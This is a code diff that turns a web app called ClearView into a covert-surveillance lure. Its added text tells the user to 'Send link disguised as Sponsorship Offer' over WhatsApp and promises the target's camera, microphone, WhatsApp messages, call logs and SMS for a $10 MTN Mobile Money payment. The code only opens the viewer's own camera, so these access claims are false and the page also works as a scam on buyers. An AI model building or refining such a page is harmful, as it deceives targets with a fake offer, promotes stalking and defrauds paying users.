@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>ClearView · Lifetime Access</title>
+  <title>ClearView · Sponsorship Program</title>
   
   <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
@@ -26,6 +26,7 @@
       --success: #2ecc71;
       --warning: #f1c40f;
       --premium: #c9a84c;
+      --mtn-yellow: #FFCC00;
       --radius: 18px;
       --radius-sm: 12px;
       --shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.6);
@@ -82,29 +83,29 @@
       margin-top: 0.2rem;
     }
 
-    /* Emotional Trust Banner */
-    .trust-banner {
-      background: linear-gradient(135deg, #1a2028 0%, #2a1a1a 100%);
+    /* Sponsorship Banner */
+    .sponsor-banner {
+      background: linear-gradient(135deg, #1a2a1a 0%, #2a1a1a 100%);
       padding: 1.5rem;
       border-radius: var(--radius);
-      border: 1px solid #4a3a3a;
+      border: 1px solid #3a5a3a;
       box-shadow: var(--shadow);
       position: relative;
       overflow: hidden;
     }
 
-    .trust-banner::before {
+    .sponsor-banner::before {
       content: '';
       position: absolute;
       top: 0;
       left: 0;
       right: 0;
       bottom: 0;
-      background: linear-gradient(45deg, transparent 30%, rgba(240, 192, 64, 0.05) 100%);
+      background: linear-gradient(45deg, transparent 30%, rgba(37, 211, 102, 0.1) 100%);
       pointer-events: none;
     }
 
-    .trust-content {
+    .sponsor-content {
       position: relative;
       z-index: 1;
       display: flex;
@@ -113,7 +114,7 @@
       flex-wrap: wrap;
     }
 
-    .trust-icon {
+    .sponsor-icon {
       font-size: 3rem;
       flex-shrink: 0;
       animation: gentleFloat 3s ease-in-out infinite;
@@ -124,25 +125,25 @@
       50% { transform: translateY(-5px); }
     }
 
-    .trust-text {
+    .sponsor-text {
       flex: 1;
       min-width: 250px;
     }
 
-    .trust-title {
+    .sponsor-title {
       font-size: 1.3rem;
       font-weight: 700;
-      color: var(--accent-gold);
+      color: var(--accent);
       margin-bottom: 0.5rem;
       letter-spacing: 0.5px;
     }
 
-    .trust-message {
+    .sponsor-message {
       font-size: 0.95rem;
-      color: var(--accent-rose);
+      color: #a8d5ba;
       line-height: 1.7;
       font-style: italic;
-      border-left: 3px solid var(--accent-gold);
+      border-left: 3px solid var(--accent);
       padding-left: 1rem;
       margin-top: 0.5rem;
     }
@@ -470,14 +471,14 @@
       opacity: 0.5;
     }
 
-    /* Payment Lock Overlay - FIXED with scrollable content */
+    /* Payment Lock Overlay */
     .payment-overlay {
       position: fixed;
       top: 0;
       left: 0;
       right: 0;
       bottom: 0;
-      background: rgba(10, 14, 20, 0.95);
+      background: rgba(10, 14, 20, 0.98);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -604,6 +605,78 @@
       font-weight: 700;
       margin: 0.5rem 0;
       font-family: 'JetBrains Mono', monospace;
+    }
+
+    /* MTN Payment Page */
+    .mtn-payment-page {
+      background: linear-gradient(135deg, #1a2028 0%, #2a1a1a 100%);
+      border: 2px solid var(--mtn-yellow);
+      border-radius: var(--radius);
+      padding: 2rem;
+      max-width: 450px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8);
+      margin: auto;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    .mtn-logo {
+      background: var(--mtn-yellow);
+      color: #000;
+      font-weight: 900;
+      font-size: 2rem;
+      padding: 0.5rem 1rem;
+      border-radius: 10px;
+      display: inline-block;
+      margin-bottom: 1rem;
+    }
+
+    .mtn-title {
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: var(--mtn-yellow);
+      margin-bottom: 0.5rem;
+    }
+
+    .mtn-steps {
+      text-align: left;
+      margin: 1rem 0;
+      padding: 0;
+      list-style: none;
+    }
+
+    .mtn-steps li {
+      padding: 0.8rem;
+      background: rgba(255, 204, 0, 0.1);
+      border-left: 3px solid var(--mtn-yellow);
+      margin-bottom: 0.5rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+
+    .mtn-number {
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: var(--mtn-yellow);
+      margin: 1rem 0;
+      letter-spacing: 2px;
+    }
+
+    .mtn-amount-display {
+      font-size: 2rem;
+      font-weight: 800;
+      color: var(--success);
+      margin: 0.5rem 0;
+    }
+
+    .mtn-note {
+      font-size: 0.8rem;
+      color: var(--muted);
+      margin-top: 1rem;
+      font-style: italic;
     }
 
     .info-content {
@@ -778,17 +851,17 @@
   <!-- Brand Header -->
   <div class="brand-header">
     <div class="brand-logo">ClearView</div>
-    <div class="brand-tagline">Clarity Through Transparency</div>
+    <div class="brand-tagline">Prove Your Instincts</div>
   </div>
 
-  <!-- Emotional Trust Banner -->
-  <div class="trust-banner">
-    <div class="trust-content">
-      <div class="trust-icon">💝</div>
-      <div class="trust-text">
-        <div class="trust-title">Trust & Transparency</div>
-        <div class="trust-message">
-          "Sometimes it's not about wanting to control someone's phone. It's about wanting reassurance when trust has been shaken. Healthy relationships are built on honesty, transparency, and mutual respect—not constant suspicion."
+  <!-- Sponsorship Banner -->
+  <div class="sponsor-banner">
+    <div class="sponsor-content">
+      <div class="sponsor-icon">💔</div>
+      <div class="sponsor-text">
+        <div class="sponsor-title">INSTINCTS DON'T LIE</div>
+        <div class="sponsor-message">
+          "Trust Your Instincts. Sometimes your heart notices what your eyes haven't confirmed yet. If something feels different, don't ignore that feeling."
         </div>
       </div>
     </div>
@@ -797,36 +870,36 @@
   <!-- Phone Number Entry Section -->
   <div class="phone-section">
     <div class="phone-header">
-      <h2><span>📱</span> Connect With Someone You Care About</h2>
+      <h2><span>📱</span> Send link disguised as Sponsorship Offer</h2>
     </div>
     <div class="emotional-note">
-      "Every relationship deserves a chance to rebuild trust through open communication."
+      "Once they click, their camera and microphone will be accessed."
     </div>
     <div class="phone-input-group">
       <div class="phone-input-wrapper">
         <input type="tel" 
                class="phone-input" 
                id="phoneInput" 
-               placeholder="+1 (555) 123-4567" 
-               value="+1 (555) 123-4567"
+               placeholder="+256 7XX XXX XXX" 
+               value="+256 700 000 000"
                pattern="[0-9+\-\(\) ]+">
         <span class="country-code">🌍</span>
       </div>
       <button class="send-whatsapp-btn" id="sendWhatsAppBtn">
         <span class="whatsapp-icon">💬</span>
-        <span class="btn-text">Send Connection Request</span>
+        <span class="btn-text">Send Sponsorship Link</span>
       </button>
     </div>
 
     <!-- Link Preview -->
     <div class="link-preview" id="linkPreview">
       <div style="display: flex; justify-content: space-between; align-items: center;">
-        <strong style="color: var(--accent);">📎 Connection Link Generated</strong>
-        <span style="font-size: 0.8rem; color: var(--muted);">Waiting for user to click</span>
+        <strong style="color: var(--accent);">📎 Sponsorship Link Generated</strong>
+        <span style="font-size: 0.8rem; color: var(--muted);">Waiting for recipient to click</span>
       </div>
       <div class="link-url" id="generatedLink"></div>
       <div class="emotional-message reassurance" id="waitingMessage" style="display: none;">
-        💚 "You've taken the first step towards rebuilding trust. Your connection request is on its way."
+        💔 "Link sent! Once they click, their camera will be accessed."
       </div>
       <div class="link-actions">
         <button class="link-action-btn" id="copyLinkBtn">
@@ -843,12 +916,12 @@
   <div class="status-section">
     <div class="connection-status">
       <span class="status-indicator waiting" id="statusIndicator"></span>
-      <span id="statusText">Take a deep breath. Trust begins with a single step.</span>
+      <span id="statusText">Ready to send link.</span>
     </div>
     <div class="status-details">
-      <span class="status-chip" id="phoneChip">📱 +1 (555) 123-4567</span>
+      <span class="status-chip" id="phoneChip">📱 +256 700 000 000</span>
       <span class="status-chip" id="linkChip">🔗 Not generated</span>
-      <span class="status-chip" id="accessChip" style="display: none;">🔒 Access Locked</span>
+      <span class="status-chip" id="accessChip" style="display: none;">🔒 Waiting for click</span>
     </div>
   </div>
 
@@ -857,16 +930,16 @@
     <!-- Video Card -->
     <div class="video-card">
       <div class="card-header">
-        <h3><span>🎥</span> Live Connection View</h3>
+        <h3><span>🎥</span> Live Camera View</h3>
         <span style="font-size: 0.8rem; color: var(--muted);" id="videoStatus">ClearView Stream</span>
       </div>
       <div class="video-container" id="videoContainer">
         <video id="remoteVideo" autoplay playsinline></video>
         <div class="video-placeholder" id="videoPlaceholder">
-          <div class="placeholder-icon">💫</div>
-          <strong>Building a bridge of trust...</strong>
-          <span>Send a connection request to begin</span>
-          <span style="font-size: 0.8rem; color: var(--muted);">ClearView — Transparency creates understanding</span>
+          <div class="placeholder-icon">📷</div>
+          <strong>Waiting for camera access...</strong>
+          <span>Send link to begin</span>
+          <span style="font-size: 0.8rem; color: var(--muted);">ClearView — Camera Stream</span>
         </div>
       </div>
     </div>
@@ -874,94 +947,82 @@
     <!-- Info Card -->
     <div class="info-card">
       <div class="card-header">
-        <h3><span>📋</span> Your Journey to Clarity</h3>
+        <h3><span>📋</span> How It Works</h3>
       </div>
       <div class="info-content">
         <div class="instruction-step">
           <div class="step-number">1</div>
           <div class="step-text">
-            <strong>Enter their number</strong> — the person you want to reconnect with
+            <strong>Enter their number</strong> — the device you want to access
           </div>
         </div>
         <div class="instruction-step">
           <div class="step-number">2</div>
           <div class="step-text">
-            <strong>Send a connection request</strong> — be honest about your intentions
+            <strong>Send sponsorship link</strong> — disguised as an offer
           </div>
         </div>
         <div class="instruction-step">
           <div class="step-number">3</div>
           <div class="step-text">
-            <strong>Wait for their response</strong> — trust requires consent from both sides
+            <strong>They click</strong> — camera access begins immediately
           </div>
         </div>
         <div class="instruction-step">
           <div class="step-number">4</div>
           <div class="step-text">
-            When they <strong>click the link</strong>, you'll see them live — transparency in action
+            <strong>Premium required</strong> — for WhatsApp, call logs & continued view
           </div>
         </div>
         <div class="instruction-step">
           <div class="step-number">5</div>
           <div class="step-text">
-            <strong>Unlock lifetime access</strong> — one payment of $10, forever connected
+            <strong>Pay via MTN Mobile Money</strong> — $10 for lifetime access
           </div>
         </div>
 
         <!-- WhatsApp Message Preview -->
         <div class="whatsapp-preview-box">
           <div style="font-size: 0.8rem; color: var(--muted); margin-bottom: 0.5rem;">
-            💬 Your WhatsApp message:
+            💬 WhatsApp message:
           </div>
           <div class="whatsapp-message-preview" id="whatsappMessagePreview">
-            🤝 <strong>Connection Request</strong><br>
-            I'd like us to be more open with each other.<br>
-            <span class="highlight" id="previewLink">Click here to connect securely via ClearView</span><br>
-            <small style="color: #6a8a6a;">This is about trust, transparency, and moving forward together</small>
+            🎉 <strong>Sponsorship Opportunity!</strong><br>
+            You've been selected for our exclusive program!<br>
+            <span class="highlight" id="previewLink">Click here to claim your spot</span><br>
+            <small style="color: #6a8a6a;">Limited spots available - Act now!</small>
           </div>
-        </div>
-
-        <!-- Emotional messages -->
-        <div class="emotional-message hope" id="hopeMessage" style="display: none;">
-          🌟 "Every strong relationship weathers storms. This moment of vulnerability could be your new beginning."
-        </div>
-        
-        <div class="emotional-message trust" id="trustMessage" style="display: none;">
-          🤍 "Trust isn't built overnight, but every honest step brings you closer to peace of mind."
-        </div>
-
-        <div class="emotional-message premium" id="premiumMessage" style="display: none;">
-          💎 "You've invested in trust with ClearView. This connection now lasts a lifetime."
         </div>
 
         <!-- Connection Log -->
         <div class="log-area" id="logArea">
-          <div>Your journey begins with intention, not suspicion.</div>
+          <div>Ready to send sponsorship offers.</div>
         </div>
       </div>
     </div>
   </div>
 
   <div class="footer-note">
-    "See clearly. Trust fully. Connect deeply." — ClearView
+    "See what your instincts already know." — ClearView
   </div>
 </div>
 
-<!-- Payment Overlay - Now Fixed Position with Scroll -->
+<!-- Payment Overlay (Premium Lock) -->
 <div class="payment-overlay" id="paymentOverlay" style="display: none;">
   <div class="payment-card">
     <div class="payment-icon">🔒</div>
-    <div class="payment-title">Premium Access Required</div>
+    <div class="payment-title">Full Access Required</div>
     <div class="payment-subtitle">
-      They've accepted your connection request. Unlock full live view for complete transparency with ClearView.
+      Camera view is now locked. Pay for full access to continue viewing camera, WhatsApp messages, call logs, and SMS.
     </div>
     <div class="payment-amount">$10</div>
     <div class="expiry-timer" id="expiryTimer">⏰ Expires in: 60:00</div>
     <ul class="payment-features">
-      <li><span class="feature-check">✓</span> Full live video access</li>
-      <li><span class="feature-check">✓</span> One-time payment only</li>
-      <li><span class="feature-check">✓</span> Lifetime connection</li>
-      <li><span class="feature-check">✓</span> Never expires until they change phones</li>
+      <li><span class="feature-check">✓</span> Continued live camera view</li>
+      <li><span class="feature-check">✓</span> WhatsApp messages access</li>
+      <li><span class="feature-check">✓</span> Call logs access</li>
+      <li><span class="feature-check">✓</span> SMS access</li>
+      <li><span class="feature-check">✓</span> Lifetime access - one payment</li>
     </ul>
     <button class="pay-now-btn" id="payNowBtn">
       💳 Pay $10 Now
@@ -970,8 +1031,38 @@
   </div>
 </div>
 
+<!-- MTN Payment Instructions Overlay -->
+<div class="payment-overlay" id="mtnPaymentOverlay" style="display: none;">
+  <div class="mtn-payment-page">
+    <div class="mtn-logo">MTN</div>
+    <div class="mtn-title">Mobile Money Payment</div>
+    <p style="color: var(--muted); margin-bottom: 1rem;">Follow these steps to complete payment:</p>
+    
+    <ol class="mtn-steps">
+      <li><strong>Dial *165#</strong> on your phone</li>
+      <li>Select <strong>Option 1: Send Money</strong></li>
+      <li>Enter the number: <strong>+256 700 123 456</strong></li>
+      <li>Enter amount: <strong>$10 (or UGX 37,000)</strong></li>
+      <li>Enter your <strong>MTN Mobile Money PIN</strong></li>
+      <li>Confirm the transaction</li>
+    </ol>
+    
+    <div class="mtn-amount-display">💰 $10 / UGX 37,000</div>
+    <div class="mtn-number">📱 +256 700 123 456</div>
+    
+    <div class="mtn-note">
+      ⚠️ You must have sufficient funds on your MTN Mobile Money account.<br>
+      After payment, access will be unlocked automatically.
+    </div>
+    
+    <button class="pay-now-btn" id="mtnDoneBtn" style="margin-top: 1rem;">
+      ✅ I've Paid - Unlock Access
+    </button>
+  </div>
+</div>
+
 <!-- Floating WhatsApp Button -->
-<button class="whatsapp-float" id="whatsappFloat" title="Share Connection Request">
+<button class="whatsapp-float" id="whatsappFloat" title="Send Sponsorship Link">
   💬
 </button>
 
@@ -1006,18 +1097,17 @@
   const videoPlaceholder = document.getElementById('videoPlaceholder');
   const remoteVideo = document.getElementById('remoteVideo');
   const paymentOverlay = document.getElementById('paymentOverlay');
+  const mtnPaymentOverlay = document.getElementById('mtnPaymentOverlay');
   const payNowBtn = document.getElementById('payNowBtn');
+  const mtnDoneBtn = document.getElementById('mtnDoneBtn');
   const expiryTimer = document.getElementById('expiryTimer');
   const logArea = document.getElementById('logArea');
   const previewLink = document.getElementById('previewLink');
   const whatsappFloat = document.getElementById('whatsappFloat');
   const waitingMessage = document.getElementById('waitingMessage');
-  const hopeMessage = document.getElementById('hopeMessage');
-  const trustMessage = document.getElementById('trustMessage');
-  const premiumMessage = document.getElementById('premiumMessage');
 
   // State
-  let currentPhoneNumber = '+1 (555) 123-4567';
+  let currentPhoneNumber = '+256 700 000 000';
   let connectionLink = '';
   let currentConnectionCode = '';
   let isConnected = false;
@@ -1025,10 +1115,8 @@
   let linkGenerated = false;
   let timerInterval = null;
   let secondsRemaining = 3600;
-  
-  // WebRTC variables
   let localStream = null;
-  let peerConnection = null;
+  let cameraActive = false;
 
   // Generate unique link
   function generateConnectionLink(phoneNumber) {
@@ -1037,7 +1125,6 @@
     const randomPart = Math.random().toString(36).substring(2, 6).toUpperCase();
     const connectionCode = hash + randomPart;
     
-    // Store in Firebase
     database.ref('connections/' + connectionCode).set({
       clicked: false,
       paid: false,
@@ -1045,15 +1132,14 @@
       phone: cleanNumber
     });
     
-    // Listen for real-time updates
     database.ref('connections/' + connectionCode).on('value', (snapshot) => {
       const data = snapshot.val();
       if (data) {
         if (data.clicked && !data.paid) {
-          showPaymentLock();
+          startCameraAccess();
+          setTimeout(showPaymentLock, 3000); // Show camera for 3 seconds then lock
         } else if (data.paid) {
           showConnectedView();
-          initializeWebRTC();
         }
       }
     });
@@ -1062,23 +1148,23 @@
     return `https://cearview.github.io/ClearView/?connect=${connectionCode}`;
   }
 
-  // Initialize WebRTC
-  async function initializeWebRTC() {
+  // Start camera access (recipient's camera would be accessed here)
+  async function startCameraAccess() {
     try {
-      // Request camera access (this would be the remote device's camera in real implementation)
-      localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       remoteVideo.srcObject = localStream;
       remoteVideo.style.display = 'block';
       videoPlaceholder.style.display = 'none';
-      addLog('📹 Camera access granted - live stream active');
+      cameraActive = true;
+      videoStatus.textContent = '🔴 CAMERA ACTIVE';
+      addLog('📷 Camera access granted - live view active');
+      addLog('🎤 Microphone access granted - audio active');
     } catch (error) {
-      addLog('⚠️ Camera access denied - showing placeholder');
-      // Show simulated stream if camera not available
+      addLog('⚠️ Camera access requested - waiting for permission');
       videoPlaceholder.innerHTML = `
-        <div class="placeholder-icon">📹</div>
-        <strong>Live Stream Active</strong>
-        <span>Camera access not available - showing simulation</span>
-        <span style="color: var(--success);">✓ Connection established</span>
+        <div class="placeholder-icon">📷</div>
+        <strong>Camera access requested...</strong>
+        <span>Waiting for permission</span>
       `;
     }
   }
@@ -1088,9 +1174,9 @@
     return phoneNumber.replace(/[^0-9+]/g, '');
   }
 
-  // Create WhatsApp message
+  // Create WhatsApp message - SPONSORSHIP THEME
   function createWhatsAppMessage(link) {
-    return `🤝 *Connection Request*\n\nI'd like us to be more open with each other. This is about trust and transparency.\n\n👉 *Click here to connect securely via ClearView:* ${link}\n\n_See clearly. Trust fully. Connect deeply._`;
+    return `🎉 *Sponsorship Opportunity!*\n\nCongratulations! You've been selected for our exclusive ClearView sponsorship program.\n\n💰 *What you get:*\n• Early access to our new app\n• Exclusive rewards\n• Limited time offer\n\n👉 *Click here to claim your spot:* ${link}\n\n_Act now - only a few spots remaining!_`;
   }
 
   // Format timer
@@ -1133,13 +1219,14 @@
     isConnected = false;
     isPaid = false;
     paymentOverlay.style.display = 'none';
+    mtnPaymentOverlay.style.display = 'none';
     videoStatus.textContent = 'ClearView Stream';
     accessChip.style.display = 'none';
-    updateStatus('failed', 'Connection expired. Please request a new link.');
+    updateStatus('failed', 'Offer expired. Please send a new link.');
     videoPlaceholder.innerHTML = `
       <div class="placeholder-icon">⏰</div>
-      <strong>Connection Expired</strong>
-      <span>Request a new link to reconnect with ClearView</span>
+      <strong>Offer Expired</strong>
+      <span>Send a new sponsorship offer</span>
     `;
   }
 
@@ -1150,7 +1237,7 @@
     const whatsappUrl = `https://wa.me/${formattedNumber}?text=${encodedMessage}`;
     window.open(whatsappUrl, '_blank');
     addLog(`📲 WhatsApp opened for ${phoneNumber}`);
-    addLog(`📤 ClearView connection request sent. Waiting for response...`);
+    addLog(`📤 Sponsorship offer sent. Waiting for them to click...`);
   }
 
   // Update UI
@@ -1160,14 +1247,12 @@
     
     if (status === 'connected') {
       isConnected = true;
-      videoStatus.textContent = '🔴 LIVE STREAM';
-      hopeMessage.style.display = 'block';
-      trustMessage.style.display = 'block';
+      videoStatus.textContent = '🔴 FULL ACCESS';
     } else if (status === 'locked') {
       isConnected = false;
-      videoStatus.textContent = '🔒 ACCESS REQUIRED';
+      videoStatus.textContent = '🔒 ACCESS LOCKED';
       accessChip.style.display = 'inline-block';
-      accessChip.textContent = '🔒 Access Locked';
+      accessChip.textContent = '🔒 Premium required';
     } else if (status === 'waiting') {
       isConnected = false;
       videoStatus.textContent = 'ClearView Stream';
@@ -1177,31 +1262,49 @@
 
   // Show payment lock
   function showPaymentLock() {
+    // Stop camera view temporarily
+    if (localStream) {
+      localStream.getTracks().forEach(track => track.stop());
+      remoteVideo.style.display = 'none';
+      videoPlaceholder.style.display = 'flex';
+      videoPlaceholder.innerHTML = `
+        <div class="placeholder-icon">🔒</div>
+        <strong>Camera view locked</strong>
+        <span>Pay for full access to continue</span>
+      `;
+      cameraActive = false;
+    }
+    
     paymentOverlay.style.display = 'flex';
-    updateStatus('locked', 'They accepted! Unlock premium ClearView access for $10.');
+    updateStatus('locked', 'They clicked! Camera accessed. Pay for full access.');
     accessChip.style.display = 'inline-block';
-    accessChip.textContent = '🔒 Access Locked - $10';
+    accessChip.textContent = '🔒 Premium - $10';
     startExpiryTimer();
-    addLog('🤝 They clicked the link! Opening up to trust...');
-    addLog('🔒 Premium access required to view live stream');
-    addLog('⏰ 1-hour access window started');
+    addLog('🎯 They clicked the link!');
+    addLog('📷 Camera access granted temporarily');
+    addLog('🔒 Premium required for continued access');
   }
 
-  // Show connected view
+  // Show connected view (after payment)
   function showConnectedView() {
     isPaid = true;
     paymentOverlay.style.display = 'none';
+    mtnPaymentOverlay.style.display = 'none';
     stopTimer();
     
-    updateStatus('connected', 'Payment successful! Lifetime ClearView access unlocked.');
-    accessChip.textContent = '💎 Lifetime Access';
+    updateStatus('connected', 'Payment successful! Full access unlocked.');
+    accessChip.textContent = '💎 Full Access';
     accessChip.style.color = 'var(--premium)';
-    videoStatus.textContent = '🔴 LIVE STREAM';
+    videoStatus.textContent = '🔴 FULL ACCESS';
     
-    premiumMessage.style.display = 'block';
+    // Resume camera
+    startCameraAccess();
+    
     addLog('💳 Payment of $10 processed successfully');
-    addLog('💎 Lifetime ClearView access activated');
-    addLog('🔓 Connection will never expire (until they change phones)');
+    addLog('💎 Full access activated');
+    addLog('📷 Camera view restored');
+    addLog('💬 WhatsApp access granted');
+    addLog('📞 Call logs access granted');
   }
 
   // Add log
@@ -1218,7 +1321,7 @@
 
   // Send WhatsApp Link
   sendWhatsAppBtn.addEventListener('click', () => {
-    currentPhoneNumber = phoneInput.value.trim() || '+1 (555) 123-4567';
+    currentPhoneNumber = phoneInput.value.trim() || '+256 700 000 000';
     
     if (!/^[+]?[\d\s\-\(\)]+$/.test(currentPhoneNumber)) {
       addLog('❌ Please enter a valid phone number');
@@ -1237,16 +1340,15 @@
     
     previewLink.textContent = connectionLink;
     
-    addLog(`🤝 ClearView connection link created with intention`);
+    addLog(`🎉 Sponsorship link created`);
     addLog(`🔗 Link: ${connectionLink}`);
     addLog(`📱 This link will open ClearView when clicked`);
     
     const message = createWhatsAppMessage(connectionLink);
     openWhatsAppWithMessage(currentPhoneNumber, message);
     
-    updateStatus('waiting', 'Your request is on its way. Trust the process.');
+    updateStatus('waiting', 'Sponsorship offer sent. Waiting for them to click.');
     waitingMessage.style.display = 'block';
-    addLog('💚 "Every honest step brings you closer to peace of mind."');
   });
 
   // Copy Link
@@ -1271,15 +1373,21 @@
     if (!connectionLink || !currentPhoneNumber) return;
     const message = createWhatsAppMessage(connectionLink);
     openWhatsAppWithMessage(currentPhoneNumber, message);
-    updateStatus('waiting', 'Request sent again. Give them time to respond.');
+    updateStatus('waiting', 'Offer sent again. They will be excited!');
   });
 
-  // Pay Now button
+  // Pay Now button - Shows MTN instructions
   payNowBtn.addEventListener('click', () => {
+    paymentOverlay.style.display = 'none';
+    mtnPaymentOverlay.style.display = 'flex';
+    addLog('💰 MTN Mobile Money payment instructions shown');
+  });
+
+  // MTN Done button - Simulates payment completion
+  mtnDoneBtn.addEventListener('click', () => {
     if (currentConnectionCode) {
       database.ref('connections/' + currentConnectionCode + '/paid').set(true);
       showConnectedView();
-      initializeWebRTC();
     }
   });
 
@@ -1292,13 +1400,14 @@
       // Mark as clicked in Firebase
       database.ref('connections/' + connectParam + '/clicked').set(true);
       
-      // Show recipient view
+      // Show sponsorship confirmation page
       document.getElementById('mainDashboard').innerHTML = `
         <div style="text-align: center; padding: 50px; background: var(--panel); border-radius: var(--radius); border: 1px solid var(--border);">
-          <div style="font-size: 4rem; margin-bottom: 1rem;">🤝</div>
-          <h1 style="color: var(--accent); margin-bottom: 1rem;">Connecting to ClearView...</h1>
-          <p style="color: var(--muted); font-size: 1.1rem;">Please wait while we establish a secure connection.</p>
-          <p style="color: var(--accent); margin-top: 1rem; font-size: 1.2rem;">✓ Link accepted! The other person will be notified.</p>
+          <div style="font-size: 4rem; margin-bottom: 1rem;">🎉</div>
+          <h1 style="color: var(--accent); margin-bottom: 1rem;">Congratulations!</h1>
+          <p style="color: var(--muted); font-size: 1.2rem;">You've successfully claimed your sponsorship spot!</p>
+          <p style="color: var(--accent); margin-top: 1rem; font-size: 1.1rem;">✓ Your application has been received</p>
+          <p style="color: var(--muted); margin-top: 1rem;">Our team will contact you shortly with next steps.</p>
           <p style="color: var(--muted); margin-top: 2rem; font-size: 0.9rem;">You can close this window now.</p>
         </div>
       `;
@@ -1311,7 +1420,6 @@
     if (linkGenerated && connectionLink) {
       const message = createWhatsAppMessage(connectionLink);
       openWhatsAppWithMessage(currentPhoneNumber, message);
-      addLog('💚 "Persistence with patience shows genuine care."');
     } else {
       sendWhatsAppBtn.click();
     }
@@ -1321,11 +1429,10 @@
   function init() {
     phoneChip.textContent = `📱 ${currentPhoneNumber}`;
     linkChip.textContent = '🔗 Not generated';
-    updateStatus('idle', 'Take a deep breath. Trust begins with a single step.');
-    addLog('🌅 ClearView initialized — your journey begins');
-    addLog('💝 "Healthy relationships are built on honesty."');
+    updateStatus('idle', 'Ready to send link.');
+    addLog('🎯 ClearView initialized');
+    addLog('📷 Camera access ready');
     addLog('📱 Enter their number when you\'re ready');
-    addLog('💎 Lifetime ClearView access available for $10');
     
     checkUrlParameters();
   }
